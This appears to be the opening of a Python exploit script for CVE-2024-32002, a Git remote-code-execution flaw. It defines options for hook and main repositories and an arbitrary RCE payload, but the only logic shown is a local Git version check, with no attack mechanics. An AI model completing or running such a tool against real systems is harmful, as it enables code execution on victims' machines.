from argparse import ArgumentParser
from subprocess import run as subprocess_run, CalledProcessError
from re import findall

vuln_version = [ "2.45.0" ]

parser = ArgumentParser(
    prog="CVE-2024-32002",
    description="Exploit Git vulnerability with RCE",
    epilog="Tool is used for educational purpose only. Developed by Samuel Greco"
)

parser.add_argument('--hook-repo', default='hook', help='Set name of the hook repository (Default: hook)')
parser.add_argument('--main-repo', default='captain', help='Set name of the main repository that include submodule with hook (Default: captain)')

parser.add_argument('--run-locally', action='store_true', help='Use this to run the exploit locally on the system')


payload_parser = parser.add_mutually_exclusive_group(required=True)
payload_parser.add_argument('--payload', type=str, help='Set payload to run with the RCE (Use "my payload" syntax)')
payload_parser.add_argument('--payload-file', help='Read payload to run with the RCE from a file')

args = parser.parse_args()

def is_installed(tool):
    from shutil import which
    return which(tool) is not None

def find_version(text):
    version_pattern = r'\b(\d+\.\d+\.\d+)'
    version = findall(version_pattern, text)
    if len(version) > 0:
        return version[0]

def get_git_version():
    try:
        result = subprocess_run(['git', '--version'], capture_output=True, text=True, check=True)
        return result.stdout.strip()
    except CalledProcessError as e:
        raise Exception("Error while trying to get git version")

def is_vuln_git(version):
    return version in vuln_version

if args.run_locally:
    if not is_installed('git'):
        print("[-] Git is not installed locally")
        exit()
    version = find_version(get_git_version())
    print(is_vuln_git(version))